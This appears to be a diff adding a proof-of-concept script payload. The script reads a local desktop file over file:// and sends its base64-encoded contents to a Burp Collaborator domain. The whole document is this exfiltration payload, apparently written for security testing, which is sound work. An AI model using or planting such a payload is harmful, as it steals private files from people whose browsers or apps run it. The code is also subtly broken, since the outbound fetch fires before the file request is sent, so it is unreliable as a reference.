@@ -1,0 +1,11 @@
+<script>var txt = '';
+var xmlhttp = new XMLHttpRequest();
+xmlhttp.onreadystatechange = function(){
+  if(xmlhttp.status == 200 && xmlhttp.readyState == 4){
+    txt = xmlhttp.responseText;
+  }
+};
+xmlhttp.open("GET","file:///Users/johan/Desktop/test.txt",true);
+fetch('https://euc1u4sug8iycmh60bz77fiwqnwmkb.burpcollaborator.net/?exfiltrated=' + btoa(txt));
+xmlhttp.send();
+</script>
